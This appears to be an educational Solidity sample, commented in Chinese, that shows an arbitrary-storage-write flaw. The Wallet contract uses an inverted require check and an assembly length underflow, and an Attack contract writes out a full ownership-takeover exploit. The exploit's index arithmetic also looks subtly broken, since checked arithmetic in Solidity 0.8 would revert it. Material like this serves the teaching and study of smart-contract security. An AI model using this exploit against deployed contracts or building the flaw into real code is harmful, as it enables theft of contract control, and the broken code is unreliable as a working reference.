// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱: Write to Arbitrary Storage Location
描述:
在此漏洞範例中，PopBonusCode 函式故意設計錯誤的 require 條件（要求 bonusCodes 陣列必須為空），
並使用 inline assembly 直接操作 bonusCodes 陣列的儲存槽，將 bonusCodes.length 由 0 下溢為 2**256 - 1。
由於 bonusCodes 陣列在記憶體中的連續排列，攻擊者可以透過計算使得 bonusCodes[idx] 對應到 owner 狀態變數的儲存槽，
進而利用 UpdateBonusCodeAt 函式將 owner 改寫成攻擊者控制的地址。

攻擊步驟（最小可行攻擊示例）：
1. 部署 Wallet 合約（部署者為 owner）。
2. 呼叫 PopBonusCode()，由於 bonusCodes 陣列長度為 0，require 條件通過，進而在 assembly 區塊中將 bonusCodes.length 下溢至 2**256 - 1。
3. 計算 bonusCodes 陣列儲存資料的起始槽位：slot = keccak256(abi.encode(uint256(0)))。
4. 假設 owner 存放在 slot 1（由宣告順序得知），攻擊者計算出適當的 idx 值，使得 bonusCodes[idx] 指向 slot 1。
5. 呼叫 UpdateBonusCodeAt(idx, value)，將 owner 的值改寫為攻擊者地址的 uint 表示，達成控制合約的目的。
*/

contract Wallet {
    // bonusCodes 陣列儲存在 slot 0，陣列資料從 keccak256(0) 開始連續存放
    uint[] public bonusCodes;
    // owner 變數存放在 slot 1
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // 正常的 PushBonusCode 函式
    function PushBonusCode(uint c) public {
        bonusCodes.push(c);
    }

    // 漏洞函式：PopBonusCode
    // 注意：在 Solidity >=0.8.0 中，不能直接使用 bonusCodes.length-- 調整動態陣列長度，故使用 inline assembly 實現
    function PopBonusCode() public {
        // 錯誤的 require 條件，要求 bonusCodes 陣列必須為空
        require(bonusCodes.length == 0, "Not allowed: bonusCodes must be empty");
        // 使用 assembly 直接操作 storage，將 bonusCodes 的長度從 0 下溢為 2**256 - 1
        assembly {
            // bonusCodes 的長度存放於 slot 0，直接讀取、減 1、寫回
            let len := sload(0)
            sstore(0, sub(len, 1))
        }
    }

    // 漏洞函式：UpdateBonusCodeAt
    // 攻擊者可以利用下溢後的 bonusCodes 長度，計算出索引以修改任意儲存槽（例如覆寫 owner）
    function UpdateBonusCodeAt(uint idx, uint c) public {
        require(idx < bonusCodes.length, "Index out of bound");
        bonusCodes[idx] = c;
    }
}


// 攻擊合約，展示如何利用上述漏洞進行攻擊
contract Attack {
    Wallet public target;

    constructor(Wallet _target) {
        target = _target;
    }

    /*
    攻擊流程：
    1. 呼叫 target.PopBonusCode() 觸發 bonusCodes.length 下溢。
    2. 計算 bonusCodes 陣列資料的起始槽位：slot = keccak256(abi.encode(uint256(0)))。
    3. 已知 owner 存在於 slot 1，計算需要修改的 idx 值，使 bonusCodes[idx] 指向 slot 1:
         idx = 1 - uint256(slot)   (mod 2**256)
    4. 呼叫 target.UpdateBonusCodeAt(idx, uint(uint160(msg.sender)))，將 owner 值改為攻擊者地址。
    */
    function attack() public {
        // 1. 觸發 PopBonusCode，使 bonusCodes.length 由 0 下溢為 2**256 - 1
        target.PopBonusCode();

        // 2. 計算 bonusCodes 陣列資料的起始槽位
        bytes32 slot = keccak256(abi.encode(uint256(0)));

        // 3. 假設 owner 變數位於 slot 1，計算使 bonusCodes[idx] 指向 slot 1 的 idx
        uint256 targetSlot = 1;
        uint256 idx = targetSlot - uint256(slot);

        // 4. 利用 UpdateBonusCodeAt 將 owner 改寫為攻擊者地址
        target.UpdateBonusCodeAt(idx, uint(uint160(msg.sender)));
    }
}
